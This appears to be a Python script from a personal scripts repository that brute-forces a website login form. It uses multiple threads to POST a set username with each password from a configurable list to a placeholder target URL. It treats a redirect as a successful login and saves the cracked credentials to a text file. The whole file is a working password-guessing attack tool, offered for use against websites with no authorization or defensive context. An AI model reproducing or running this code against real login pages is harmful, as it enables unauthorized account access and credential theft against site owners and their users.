#!/usr/bin/python3

# author Diego Rodríguez Riera
# from https://github.com/riera90/scripts
# licenced under BSD 3-Clause License
# date 10/01/19

# Intended to use on websites, what else would you use this for...


import requests
import re
import json
import threading
import time
import os


################################################################################
############################### Configuration ##################################
################################################################################
number_of_threads = 4
# target login
target_login = "https://target.es/login"
# target username and password input
login_html = "username"
password_html = "password"
# user to try passwords on
login = "username"
# list of passwords, be imaginative
passwords = ["this","is","a","list","of","passwords"]
################################################################################
########################### end of Configuration ###############################
################################################################################

# lock for the threads
lock = threading.Lock()
# index of passwords for the threads
password_iterator = 0
# event, all threads are initialized
initialized = threading.Event()
initialized.clear()


# this function tests a series of passwords
def test_passwords_thread():
	# make the password_iterator global here
	global password_iterator
	# creates a local thread data
	thread_data = threading.local()
	# creates the session (mainly to store cookies1)
	thread_data.bot = requests.session()
	thread_data.thread_name = threading.currentThread().getName()
	# makes the GET
	thread_data.response = thread_data.bot.get(url = target_login)
	print(thread_data.thread_name,"-> login GET:")
	print("\tstatus_code      -->", thread_data.response.status_code)
	print("\tresponse.history -->", thread_data.response.history)
	print("\tredirected to    -->", thread_data.response.url)
	
	
	initialized.wait(timeout=10)
	# here we go
	while password_iterator < len(passwords):
		lock.acquire()
		try:
			thread_data.password = passwords[password_iterator]
			password_iterator += 1
		except:
			return
		# sets the form data
		thread_data.form = {login_html:login,
							password_html:thread_data.password}
		# makes the post
		thread_data.response = thread_data.bot.post(url = target_login, data = thread_data.form)
		# decoment this if you want to know more info
		print(thread_data.thread_name,"-> trying",login,";",thread_data.password)
		# print("\tstatus_code      -->", thread_data.response.status_code)
		# print("\tresponse.history -->", thread_data.response.history)
		# print("\tis redirect      -->", thread_data.response.is_redirect)
		# print("\tis p redirect    -->", thread_data.response.is_permanent_redirect)
		# print("\tnext             -->", thread_data.response.next)
		# print("\tredirected to    -->",thread_data.response.url)
		# print("\theaders          -->", thread_data.response.headers)
		# print("\ttext          -->", thread_data.response.text)
		lock.release()
		
		# if the seession is redirected, we got the good password
		# you can always parse the content of the response if this does not works
		if thread_data.response.url != target_login:
			print("\n")
			print(thread_data.thread_name,"-> correct password is:", thread_data.password)
			print(thread_data.thread_name,"-> saving password into correct_password.txt")
			file = open('correct_password.txt', 'a')
			file.write(str(thread_data.thread_name))
			file.write(' -> ')
			file.write(login)
			file.write(';')
			file.write(thread_data.password)
			file.write('\n')
			file.close()
			os._exit(0)



# creates the threads
print("initializing threads.")
threads = []
for i in range(number_of_threads):
	t = threading.Thread(target=test_passwords_thread, name='thread '+str(i))
	threads.append(t)
# launches the threads
for thread in threads:
	thread.start()
	
time.sleep(2)
initialized.set()
	
	
# joins the threads
for thread in threads:
	thread.join()